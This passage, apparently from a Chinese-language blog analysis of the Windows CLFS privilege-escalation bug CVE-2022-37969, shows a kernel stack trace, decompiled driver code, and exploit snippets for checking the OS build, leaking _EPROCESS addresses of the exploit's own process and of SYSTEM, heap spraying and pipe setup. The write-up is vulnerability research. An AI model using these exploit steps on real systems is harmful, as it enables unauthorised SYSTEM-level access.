style="color:#75715e"># Child-SP RetAddr Call Site</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">00</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa5e0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f120b CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa640 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f8b0f CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>DeleteBaseFileAndContainers<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf3</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa690 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f8761 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>Finalize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x39b</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa6c0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b71df42 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>Release<span style="color:#f92672">+</span><span style="color:#ae81ff">0xb1</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa720 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b720878 CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Close<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd6</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa770 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b720747 CLFS<span style="color:#f92672">!</span>ClfsDispatchIoRequest<span style="color:#f92672">+</span><span style="color:#ae81ff">0x108</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa7c0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d8abac5 CLFS<span style="color:#f92672">!</span>CClfsDriver<span style="color:#f92672">::</span>LogIoDispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x27</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa7f0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dbf088f nt<span style="color:#f92672">!</span>IofCallDriver<span style="color:#f92672">+</span><span style="color:#ae81ff">0x55</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa830 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc19af0 nt<span style="color:#f92672">!</span>IopDeleteFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa8b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d8ae1a7 nt<span style="color:#f92672">!</span>ObpRemoveObjectRoutine<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>a fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa910 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc22449 nt<span style="color:#f92672">!</span>ObfDereferenceObjectWithTag<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc7</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>b fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa950 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>dc2627c nt<span style="color:#f92672">!</span>ObCloseHandleTableEntry<span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c9</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>c fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aaa90 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>da0a2b5 nt<span style="color:#f92672">!</span>NtClose<span style="color:#f92672">+</span><span style="color:#ae81ff">0xec</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aab00<span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b48d124 nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x25</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">0000001</span>d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">518f</span>e678<span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">08</span>bea405 ntdll<span style="color:#f92672">!</span>NtClose<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0f</span><span style="color:#ae81ff">0000001</span>d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">518f</span>e680<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">0x00007ff8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">08</span>bea405</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10f</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ebf<span style="color:#ae81ff">498</span>b7f18 mov rdi,qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ec3<span style="color:#ae81ff">4885ff</span> test rdi,rdi</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ec6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">84</span>b9000000 je CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d5</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716f85)</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ecc<span style="color:#ae81ff">4983671800</span> and qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ed1<span style="color:#ae81ff">65488</span>b142588010000 mov rdx,qword ptr gs:[<span style="color:#ae81ff">188</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716eda<span style="color:#ae81ff">488</span>b4e20 mov rcx,qword ptr [rsi<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ede<span style="color:#ae81ff">4</span>c8b15c3d1ffff mov r10,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">_imp_ExReleaseResourceForThreadLite</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b7140a8)]</span></span><span style="display:flex;"><span>fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b716ee5 e8a6552102 call nt<span style="color:#f92672">!</span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span> (fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>d92c490)</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">RemoveContainer</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v2;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v4;<span style="color:#75715e">// r14</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v7;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> Symbol;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v10;<span style="color:#75715e">// r15</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v11;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v12;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v15;<span style="color:#75715e">// [rsp+20h] [rbp-38h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v16;<span style="color:#75715e">// [rsp+24h] [rbp-34h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v17;<span style="color:#75715e">// [rsp+70h] [rbp+18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> v4;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v7 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_14:</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v9;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(this, v7, v2,<span style="color:#f92672">&amp;</span>v17);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> v17;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v17 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">RemoveSymbol</span>(this, v7);</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v9;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v17)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlClearBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>), v2,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlNumberOfSetBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span><span style="color:#f92672">--*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">300</span>);</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">FlushImage</span>(this);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>), (ERESOURCE_THREAD)<span style="color:#a6e22e">KeGetCurrentThread</span>());</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v12<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>i64))(v12);</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v12<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64))(v12);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> v16;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_20;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v11<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">OffsetToAddr</span>(this);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v2<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>)<span style="color:#f92672">=</span> (_DWORD)v17;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlSetBits</span>((PRTL_BITMAP)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">232</span>), v2,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v10<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span><span style="color:#f92672">++*</span>(_DWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">300</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_19;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_14;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>LABEL_19:</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> v15;</span></span><span style="display:flex;"><span>LABEL_20:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v4 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExReleaseResourceForThreadLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>), (ERESOURCE_THREAD)<span style="color:#a6e22e">KeGetCurrentThread</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v16;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>最后附上zscaler画的流程图</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/6.png"/></p><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part" target="_blank">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part</a></p></blockquote><h3 id="exp分析">EXP分析</h3><p>首先通过查询<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuild</code> 来确定系统版本是否在范围内，因为在_EPROCESS中_TOKEN偏移是不固定的，此次所使用的偏移为0x4B8.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE,<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">"SOFTWARE</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows NT</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">CurrentVersion"</span>), NULL, KEY_READ,<span style="color:#f92672">&amp;</span>hKey)<span style="color:#f92672">==</span> ERROR_SUCCESS) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[+] Registry key Opened successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RegQueryValueEx</span>(hKey,<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">"CurrentBuild"</span>), NULL,<span style="color:#f92672">&amp;</span>cType, (LPBYTE)lpData,<span style="color:#f92672">&amp;</span>buffersize);</span></span><span style="display:flex;"><span><span style="color:#75715e">// -1表示处理整个缓冲区</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">WideCharToMultiByte</span>(CP_UTF8,<span style="color:#ae81ff">0</span>, lpData,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (LPSTR)buf,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> winversion<span style="color:#f92672">=</span><span style="color:#a6e22e">atoi</span>(buf);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"[+] Windows Build Number: %i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, winversion);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (winversion<span style="color:#f92672">>=</span><span style="color:#ae81ff">17763</span><span style="color:#f92672">&amp;&amp;</span> winversion<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">22000</span>) {</span></span><span style="display:flex;"><span> token_offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4b8</span>;<span style="color:#75715e">// store the token offset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[!] Version %d not supported. Exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, winversion);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>EXP通过调用<code>NtQuerySystemInformation</code> 函数，并将<code>SystemInformationClass</code> 参数设置为<code>SystemExtendedHandleInformation</code> 查询系统句柄信息（进程），遍历handle 列表，通过比较UniqueProcessId来确定找到的进程PID并返回其_EPROCESS地址，EXP中分别获取到自身的_EPROCESS地址和pid为4的进程的_EPROCESS地址。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>status<span style="color:#f92672">=</span><span style="color:#a6e22e">fnNtQuerySystemInformation</span>((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, handleInfo, handleInfoSize,<span style="color:#f92672">&amp;</span>retLength);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (ULONG i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> handleInfo<span style="color:#f92672">-></span>NumberOfHandles; i<span style="color:#f92672">++</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((USHORT)Object<span style="color:#f92672">==</span><span style="color:#ae81ff">0x4</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x4</span><span style="color:#f92672">==</span> (DWORD)handleInfo<span style="color:#f92672">-></span>Handles[i].UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> (SIZE_T)Object<span style="color:#f92672">==</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].HandleValue)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> kernelAddress<span style="color:#f92672">=</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].Object;</span></span><span style="display:flex;"><span> bFind<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetCurrentProcessId</span>()<span style="color:#f92672">==</span> (DWORD)handleInfo<span style="color:#f92672">-></span>Handles[i].UniqueProcessId<span style="color:#f92672">&amp;&amp;</span> (SIZE_T)Object<span style="color:#f92672">==</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].HandleValue)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> kernelAddress<span style="color:#f92672">=</span> (SIZE_T)handleInfo<span style="color:#f92672">-></span>Handles[i].Object;</span></span><span style="display:flex;"><span> bFind<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>EXP进行堆喷射，循环在偏移0x10000开始每隔0x10位置写入0x500000。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/7.png"/></p><p>绕过CreatePipe创建管道并通过<code>NtFsControlFile</code>设置管道属性，其中<code>FsControlCode</code> 参数被设为0x11003c，这使得在之后可以通过调用<code>NtFsControlFile</code>并传递<code>FsControlCode</code> 